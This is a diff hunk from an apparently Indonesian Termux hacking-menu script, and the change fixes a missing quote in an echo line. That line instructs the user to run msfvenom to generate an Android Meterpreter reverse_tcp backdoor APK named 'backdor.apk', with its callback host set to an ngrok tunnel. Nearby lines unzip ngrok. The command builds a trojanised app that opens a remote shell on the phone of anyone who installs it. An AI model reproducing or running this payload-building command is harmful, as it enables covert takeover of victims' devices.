@@ -898,7 +898,7 @@ unzip ngrok-stable-linux-arm.zip
 echo $yellow"Buka tab ke 2"
 echo $yellow"Jalankan perintah"
 echo $yellow"$termux-setup-storage"
-echo $yellow"$msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=(port) R> /sdcard/backdor.apk
+echo $yellow"$msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=(port) R> /sdcard/backdor.apk"
 fi
 
 if [ $akm = 42 ] || [ $akm = 42 ]
